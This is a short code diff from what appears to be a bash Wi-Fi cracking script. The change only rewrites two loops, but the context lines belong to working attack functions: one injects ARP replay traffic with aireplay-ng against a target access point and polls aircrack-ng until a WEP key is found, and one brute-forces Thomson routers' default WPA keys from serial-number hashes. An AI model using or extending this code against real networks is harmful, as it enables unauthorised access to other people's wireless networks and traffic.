@@ -413,7 +413,7 @@ crack_wep() {
     aireplay-ng -3 -b "$bssid" "$MON" > "$WORK/wep-arp-$bssid.log" 2>&1 &
     arp_pid=$!
     local i
-    for i in $(seq 1 60); do
+    for ((i=1;i<=60;i++)); do
       sleep 5
       if [ -f "${prefix}-01.cap" ] && aircrack-ng "${prefix}-01.cap" 2>/dev/null | grep -qi 'KEY FOUND'; then
         break
@@ -536,7 +536,7 @@ derive_default_psks() {
            [[ "$essid" =~ ^[Tt]homson([0-9A-Fa-f]{6})$ ]]; then
           local suffix="${BASH_REMATCH[1]}"
           local i serial
-          for i in $(seq 0 65535); do
+          for ((i=0;i<=65535;i++)); do
             serial=$(printf 'CP%04X%s' "$i" "$suffix")
             printf '%s' "$serial" | sha1sum 2>/dev/null | cut -c1-10 | tr 'a-f' 'A-F'
           done
